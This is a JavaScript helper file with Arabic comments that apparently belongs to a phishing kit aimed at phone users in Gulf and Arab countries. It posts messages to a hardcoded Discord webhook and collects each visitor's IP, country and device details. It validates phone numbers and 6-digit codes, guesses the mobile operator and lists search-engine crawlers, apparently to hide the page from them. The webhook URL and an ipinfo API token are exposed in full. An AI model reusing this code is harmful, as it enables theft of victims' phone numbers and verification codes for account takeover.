// ملف الوظائف المشتركة

// وظيفة إرسال البيانات إلى Discord
async function sendToDiscord(message) {
    const webhookUrl = 'https://discord.com/api/webhooks/1374155202957152396/3zVluUSPNxJhR0LGrQtxgKCLJKtZVCLuWCH4BauDF5Syac_krLmlb3NMv6sF9sWBt629';
    
    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: message
            })
        });
        
        return response.ok;
    } catch (error) {
        console.error('خطأ في الإرسال:', error);
        return false;
    }
}

// وظيفة الحصول على معلومات IP والدولة
async function getIPInfo() {
    try {
        const response = await fetch('https://ipinfo.io/json?token=06b4b540d0a4a3');
        const data = await response.json();
        return {
            ip: data.ip || 'غير معروف',
            country: data.country || 'غير معروف',
            countryCode: data.country || 'غير معروف'
        };
    } catch (error) {
        return {
            ip: 'غير معروف',
            country: 'غير معروف',
            countryCode: 'غير معروف'
        };
    }
}

// وظيفة تحويل كود الدولة إلى كود الهاتف
function getCountryPhoneCode(countryCode) {
    const countryToPhoneCode = {
        'OM': '+968', // عمان
        'SA': '+966', // السعودية
        'AE': '+971', // الإمارات
        'KW': '+965', // الكويت
        'QA': '+974', // قطر
        'BH': '+973', // البحرين
        'EG': '+20',  // مصر
        'DZ': '+213', // الجزائر
        'TN': '+216', // تونس
        'MA': '+212', // المغرب
        'LY': '+218', // ليبيا
        'SD': '+249', // السودان
        'YE': '+967', // اليمن
        'IQ': '+964', // العراق
        'SY': '+963', // سوريا
        'JO': '+962', // الأردن
        'LB': '+961', // لبنان
        'PS': '+970'  // فلسطين
    };
    
    return countryToPhoneCode[countryCode] || '+966'; // افتراضي السعودية
}

// وظيفة الحصول على معلومات الجهاز ونظام التشغيل
function getDeviceInfo() {
    const ua = navigator.userAgent;
    let device = 'غير معروف';
    let os = 'غير معروف';
    
    if (/Android/i.test(ua)) {
        device = 'هاتف Android';
        const match = ua.match(/Android\s([0-9\.]+)/);
        os = match ? 'Android ' + match[1] : 'Android';
    } else if (/iPhone|iPad|iPod/i.test(ua)) {
        device = 'هاتف iPhone';
        const match = ua.match(/OS (\d+[_\d]*)/);
        os = match ? 'iOS ' + match[1].replace(/_/g, '.') : 'iOS';
    } else if (/Windows/i.test(ua)) {
        device = 'كمبيوتر';
        const match = ua.match(/Windows NT ([0-9\.]+)/);
        os = match ? 'Windows ' + match[1] : 'Windows';
    } else if (/Macintosh/i.test(ua)) {
        device = 'جهاز Mac';
        os = 'macOS';
    }
    
    return { device, os };
}

// وظيفة عرض رسالة خطأ
function showError(message) {
    const errorElement = document.getElementById('errorMsg');
    if (errorElement) {
        errorElement.textContent = message;
        errorElement.style.display = 'block';
    }
}

// وظيفة إخفاء رسالة الخطأ
function hideError() {
    const errorElement = document.getElementById('errorMsg');
    if (errorElement) {
        errorElement.style.display = 'none';
    }
}

// وظيفة عرض نافذة التحميل
function showLoading(text = 'جاري الاتصال ...') {
    const loadingOverlay = document.getElementById('loadingPopup');
    const loadingText = document.getElementById('loadingText');
    
    if (loadingOverlay) {
        loadingOverlay.style.display = 'flex';
    }
    
    if (loadingText) {
        loadingText.textContent = text;
    }
}

// وظيفة إخفاء نافذة التحميل
function hideLoading() {
    const loadingOverlay = document.getElementById('loadingPopup');
    if (loadingOverlay) {
        loadingOverlay.style.display = 'none';
    }
}

// وظيفة تعطيل النموذج
function disableForm(formId) {
    const form = document.getElementById(formId);
    if (form) {
        const inputs = form.querySelectorAll('input, button, select');
        inputs.forEach(input => input.disabled = true);
    }
}

// وظيفة تفعيل النموذج
function enableForm(formId) {
    const form = document.getElementById(formId);
    if (form) {
        const inputs = form.querySelectorAll('input, button, select');
        inputs.forEach(input => input.disabled = false);
    }
}

// وظيفة حفظ البيانات في localStorage
function saveToStorage(key, value) {
    try {
        localStorage.setItem(key, value);
        return true;
    } catch (error) {
        console.error('خطأ في حفظ البيانات:', error);
        return false;
    }
}

// وظيفة استرجاع البيانات من localStorage
function getFromStorage(key) {
    try {
        return localStorage.getItem(key);
    } catch (error) {
        console.error('خطأ في استرجاع البيانات:', error);
        return null;
    }
}

// وظيفة التحقق من رقم الهاتف بناءً على الدولة
function validatePhoneNumber(phone, countryCode) {
    switch(countryCode) {
        case '+968': // عمان
            return /^[679]\d{7}$/.test(phone);
        case '+966': // السعودية
            return /^5\d{8}$/.test(phone);
        case '+971': // الإمارات
            return /^5[0-9]\d{7}$/.test(phone);
        case '+965': // الكويت
            return /^[569]\d{7}$/.test(phone);
        case '+974': // قطر
            return /^[3-7]\d{7}$/.test(phone);
        case '+973': // البحرين
            return /^[3-9]\d{7}$/.test(phone);
        case '+20': // مصر
            return /^1[0-2,5]\d{8}$/.test(phone);
        default:
            return /^\d{8,12}$/.test(phone);
    }
}

// وظيفة الحصول على المشغل من رقم الهاتف
function getOperator(phone, countryCode) {
    switch(countryCode) {
        case '+968': // عمان
            if (/^9[1-9]/.test(phone)) return 'Omantel';
            if (/^7[1-9]/.test(phone)) return 'Ooredoo';
            if (/^6[1-9]/.test(phone)) return 'Vodafone Oman';
            break;
        case '+966': // السعودية
            if (/^50|53|55/.test(phone)) return 'STC';
            if (/^54|56/.test(phone)) return 'Mobily';
            if (/^58|59/.test(phone)) return 'Zain';
            break;
        case '+971': // الإمارات
            if (/^50|54|56/.test(phone)) return 'Etisalat';
            if (/^52|55|58/.test(phone)) return 'du';
            break;
        case '+965': // الكويت
            if (/^5[0-9]/.test(phone)) return 'Zain';
            if (/^6[0-9]/.test(phone)) return 'Ooredoo';
            if (/^9[0-9]/.test(phone)) return 'STC';
            break;
        case '+974': // قطر
            if (/^3[0-9]|5[0-9]/.test(phone)) return 'Ooredoo';
            if (/^6[0-9]|7[0-9]/.test(phone)) return 'Vodafone Qatar';
            break;
        case '+973': // البحرين
            if (/^3[0-9]/.test(phone)) return 'Batelco';
            if (/^6[0-9]/.test(phone)) return 'Zain Bahrain';
            if (/^7[0-9]/.test(phone)) return 'STC Bahrain';
            break;
        case '+20': // مصر
            if (/^10/.test(phone)) return 'Vodafone Egypt';
            if (/^11/.test(phone)) return 'Etisalat Egypt';
            if (/^12/.test(phone)) return 'Orange Egypt';
            if (/^15/.test(phone)) return 'WE';
            break;
    }
    return 'غير معروف';
}

// وظيفة التحقق من رقم الهاتف العماني (للتوافق مع الكود القديم)
function validateOmanPhone(phone) {
    return validatePhoneNumber(phone, '+968');
}

// وظيفة التحقق من رمز مكون من 6 أرقام
function validateCode(code) {
    return /^\d{6}$/.test(code);
}

// وظيفة التحقق من البوتات (اختياري - يمكن استخدامه في المستقبل)
function isBot() {
    const botPatterns = [
        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
        'YandexBot', 'Sogou', 'Exabot', 'facebot', 'facebookexternalhit',
        'ia_archiver', 'MetaBot', 'Amazonbot'
    ];
    
    const ua = navigator.userAgent;
    return botPatterns.some(bot => ua.includes(bot));
}
